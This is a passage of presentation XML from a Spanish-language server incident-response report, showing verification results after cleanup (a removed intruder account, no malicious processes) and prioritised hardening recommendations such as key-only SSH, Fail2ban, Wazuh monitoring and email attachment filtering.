        <draw:custom-shape svg:x="5.18in" svg:y="2.7in" svg:width="4.72in" svg:height="1.28in" draw:id="id360" draw:style-name="a1035" draw:name="Shape 15">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id361" draw:style-name="a1036" draw:name="Image 4" svg:x="5.3in" svg:y="2.8in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="5.83in" svg:y="2.8in" svg:width="4in" svg:height="0.32in" draw:id="id362" draw:style-name="a1040" draw:name="Text 16">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1039" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1037" text:class-names="">Servicios del sistema no estándar</text:span><text:span text:style-name="a1038" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.83in" svg:y="3.14in" svg:width="4in" svg:height="0.28in" draw:id="id363" draw:style-name="a1044" draw:name="Text 17">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1043" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1041" text:class-names="">Solo servicios legítimos</text:span><text:span text:style-name="a1042" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="3.52in" svg:width="4.45in" svg:height="0.38in" draw:id="id364" draw:style-name="a1048" draw:name="Text 18">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1047" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1045" text:class-names="">Solo snap/lxd y configuración estándar de SSH.</text:span><text:span text:style-name="a1046" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.12in" svg:width="4.72in" svg:height="1.28in" draw:id="id365" draw:style-name="a1049" draw:name="Shape 19">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id366" draw:style-name="a1050" draw:name="Image 5" svg:x="0.44in" svg:y="4.22in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="0.97in" svg:y="4.22in" svg:width="4in" svg:height="0.32in" draw:id="id367" draw:style-name="a1054" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1053" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1051" text:class-names="">Usuarios del sistema</text:span><text:span text:style-name="a1052" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.97in" svg:y="4.56in" svg:width="4in" svg:height="0.28in" draw:id="id368" draw:style-name="a1058" draw:name="Text 21">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1057" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1055" text:class-names="">Solo sysadmin y reports</text:span><text:span text:style-name="a1056" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="4.94in" svg:width="4.45in" svg:height="0.38in" draw:id="id369" draw:style-name="a1062" draw:name="Text 22">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1061" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1059" text:class-names="">Cuenta 'hacker' eliminada. Lista limpia verificada.</text:span><text:span text:style-name="a1060" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="4.12in" svg:width="4.72in" svg:height="1.28in" draw:id="id370" draw:style-name="a1063" draw:name="Shape 23">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id371" draw:style-name="a1064" draw:name="Image 6" svg:x="5.3in" svg:y="4.22in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="5.83in" svg:y="4.22in" svg:width="4in" svg:height="0.32in" draw:id="id372" draw:style-name="a1068" draw:name="Text 24">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1067" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1065" text:class-names="">Procesos sospechosos en ejecución</text:span><text:span text:style-name="a1066" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.83in" svg:y="4.56in" svg:width="4in" svg:height="0.28in" draw:id="id373" draw:style-name="a1072" draw:name="Text 25">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1071" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1069" text:class-names="">Sin procesos maliciosos</text:span><text:span text:style-name="a1070" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="4.94in" svg:width="4.45in" svg:height="0.38in" draw:id="id374" draw:style-name="a1076" draw:name="Text 26">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1075" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1073" text:class-names="">grep payload → Solo el propio grep. /tmp/.temp no existe.</text:span><text:span text:style-name="a1074" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a1082">
          <draw:page-thumbnail draw:page-number="9" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id375" presentation:style-name="a1077" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id376" presentation:style-name="a1078" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id377" presentation:style-name="a1081" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a1080" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1079" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">9</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 10" draw:style-name="a1083" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-265">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id378" draw:style-name="a1084" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id379" draw:style-name="a1085" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image19.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id380" draw:style-name="a1089" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1088" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1086" text:class-names="">¿Cómo evitar que pase de nuevo? — Recomendaciones</text:span><text:span text:style-name="a1087"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381" draw:style-name="a1093" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1092" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1090" text:class-names="">Medidas ordenadas por prioridad para fortalecer la seguridad del sistema</text:span><text:span text:style-name="a1091" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="3.1in" svg:height="4.07in" draw:id="id382" draw:style-name="a1094" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="3.1in" svg:height="0.45in" draw:id="id383" draw:style-name="a1095" draw:name="Shape 4">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.42in" svg:y="1.31in" svg:width="2.9in" svg:height="0.38in" draw:id="id384" draw:style-name="a1099" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1098" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1096" text:class-names="">🔴 <text:s text:c="1"/>Inmediato</text:span><text:span text:style-name="a1097" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="1.83in" svg:width="0.22in" svg:height="0.22in" draw:id="id385" draw:style-name="a1100" draw:name="Shape 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7in" svg:y="1.82in" svg:width="2.55in" svg:height="0.28in" draw:id="id386" draw:style-name="a1104" draw:name="Text 7">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1103" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1101" text:class-names="">Capacitar a empleados</text:span><text:span text:style-name="a1102" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="2.1in" svg:width="2.85in" svg:height="0.78in" draw:id="id387" draw:style-name="a1108" draw:name="Text 8">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1107" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1105" text:class-names="">Formación en identificar correos falsos y no ejecutar scripts no verificados. Este ataque habría fallado con esta medida.</text:span><text:span text:style-name="a1106" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="3.01in" svg:width="0.22in" svg:height="0.22in" draw:id="id388" draw:style-name="a1109" draw:name="Shape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7in" svg:y="3in" svg:width="2.55in" svg:height="0.28in" draw:id="id389" draw:style-name="a1113" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1112" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1110" text:class-names="">SSH solo con llaves</text:span><text:span text:style-name="a1111" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="3.28in" svg:width="2.85in" svg:height="0.78in" draw:id="id390" draw:style-name="a1117" draw:name="Text 11">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1116" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1114" text:class-names="">Deshabilitar acceso por contraseña. Con llaves criptográficas, la fuerza bruta es imposible.</text:span><text:span text:style-name="a1115" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="4.19in" svg:width="0.22in" svg:height="0.22in" draw:id="id391" draw:style-name="a1118" draw:name="Shape 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7in" svg:y="4.18in" svg:width="2.55in" svg:height="0.28in" draw:id="id392" draw:style-name="a1122" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1121" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1119" text:class-names="">Instalar Fail2ban</text:span><text:span text:style-name="a1120" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.46in" svg:y="4.46in" svg:width="2.85in" svg:height="0.78in" draw:id="id393" draw:style-name="a1126" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1125" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1123" text:class-names="">Bloqueo automático de IPs tras N intentos fallidos de SSH. Habría detenido el ataque de fuerza bruta.</text:span><text:span text:style-name="a1124" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.55in" svg:y="1.28in" svg:width="3.1in" svg:height="4.07in" draw:id="id394" draw:style-name="a1127" draw:name="Shape 15">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.55in" svg:y="1.28in" svg:width="3.1in" svg:height="0.45in" draw:id="id395" draw:style-name="a1128" draw:name="Shape 16">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.65in" svg:y="1.31in" svg:width="2.9in" svg:height="0.38in" draw:id="id396" draw:style-name="a1132" draw:name="Text 17">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1131" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1129" text:class-names="">🟡 <text:s text:c="1"/>Próximo mes</text:span><text:span text:style-name="a1130" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.69in" svg:y="1.83in" svg:width="0.22in" svg:height="0.22in" draw:id="id397" draw:style-name="a1133" draw:name="Shape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in" svg:y="1.82in" svg:width="2.55in" svg:height="0.28in" draw:id="id398" draw:style-name="a1137" draw:name="Text 19">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1136" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1134" text:class-names="">Activar monitoreo Wazuh</text:span><text:span text:style-name="a1135" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.69in" svg:y="2.1in" svg:width="2.85in" svg:height="0.78in" draw:id="id399" draw:style-name="a1141" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1140" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1138" text:class-names="">El agente ya está instalado. Conectarlo a un servidor central para alertas automáticas en tiempo real.</text:span><text:span text:style-name="a1139" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.69in" svg:y="3.01in" svg:width="0.22in" svg:height="0.22in" draw:id="id400" draw:style-name="a1142" draw:name="Shape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in" svg:y="3in" svg:width="2.55in" svg:height="0.28in" draw:id="id401" draw:style-name="a1146" draw:name="Text 22">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1145" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1143" text:class-names="">Revisar grupo lxd</text:span><text:span text:style-name="a1144" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.69in" svg:y="3.28in" svg:width="2.85in" svg:height="0.78in" draw:id="id402" draw:style-name="a1150" draw:name="Text 23">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1149" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1147" text:class-names="">Verificar si sysadmin necesita este grupo. Puede usarse para escalar privilegios.</text:span><text:span text:style-name="a1148" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.69in" svg:y="4.19in" svg:width="0.22in" svg:height="0.22in" draw:id="id403" draw:style-name="a1151" draw:name="Shape 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in" svg:y="4.18in" svg:width="2.55in" svg:height="0.28in" draw:id="id404" draw:style-name="a1155" draw:name="Text 25">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1154" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1152" text:class-names="">Filtrar correos sospechosos</text:span><text:span text:style-name="a1153" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="3.69in" svg:y="4.46in" svg:width="2.85in" svg:height="0.78in" draw:id="id405" draw:style-name="a1159" draw:name="Text 26">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1158" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1156" text:class-names="">Bloquear adjuntos .sh, .py, .bin y URLs externas no verificadas en el servidor de correo.</text:span><text:span text:style-name="a1157" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.78in" svg:y="1.28in" svg:width="3.1in" svg:height="4.07in" draw:id="id406" draw:style-name="a1160" draw:name="Shape 27">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.78in" svg:y="1.28in" svg:width="3.1in" svg:height="0.45in" draw:id="id407" draw:style-name="a1161" draw:name="Shape 28">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.88in" svg:y="1.31in" svg:width="2.9in" svg:height="0.38in" draw:id="id408" draw:style-name="a1165" draw:name="Text 29">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1164" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1162" text:class-names="">🟢 <text:s text:c="1"/>Próximo trimestre</text:span><text:span text:style-name="a1163" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.92in" svg:y="1.83in" svg:width="0.22in" svg:height="0.22in" draw:id="id409" draw:style-name="a1166" draw:name="Shape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23in" svg:y="1.82in" svg:width="2.55in" svg:height="0.28in" draw:id="id410" draw:style-name="a1170" draw:name="Text 31">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1169" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1167" text:class-names="">Auditorías trimestrales</text:span><text:span text:style-name="a1168" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.92in" svg:y="2.1in" svg:width="2.85in" svg:height="0.78in" draw:id="id411" draw:style-name="a1174" draw:name="Text 32">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1173" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1171" text:class-names="">Revisar usuarios, crons, servicios activos y firewall regularmente para detectar desviaciones.</text:span><text:span text:style-name="a1172" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.92in" svg:y="3.01in" svg:width="0.22in" svg:height="0.22in" draw:id="id412" draw:style-name="a1175" draw:name="Shape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23in" svg:y="3in" svg:width="2.55in" svg:height="0.28in" draw:id="id413" draw:style-name="a1179" draw:name="Text 34">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1178" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1176" text:class-names="">Backups con integridad</text:span><text:span text:style-name="a1177" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.92in" svg:y="3.28in" svg:width="2.85in" svg:height="0.78in" draw:id="id414" draw:style-name="a1183" draw:name="Text 35">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1182" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1180" text:class-names="">Copias de seguridad con checksums para restauración completa y detección de cambios no autorizados.</text:span><text:span text:style-name="a1181" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.92in" svg:y="4.19in" svg:width="0.22in" svg:height="0.22in" draw:id="id415" draw:style-name="a1184" draw:name="Shape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23in" svg:y="4.18in" svg:width="2.55in" svg:height="0.28in" draw:id="id416" draw:style-name="a1188" draw:name="Text 37">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1187" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1185" text:class-names="">Plan de respuesta documentado</text:span><text:span text:style-name="a1186" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.92in" svg:y="4.46in" svg:width="2.85in" svg:height="0.78in" draw:id="id417" draw:style-name="a1192" draw:name="Text 38">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1191" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1189" text:class-names="">Protocolo formal para futuros incidentes: roles, pasos, comunicación y tiempos de respuesta.</text:span><text:span text:style-name="a1190" text:class-names=""/></text:p>
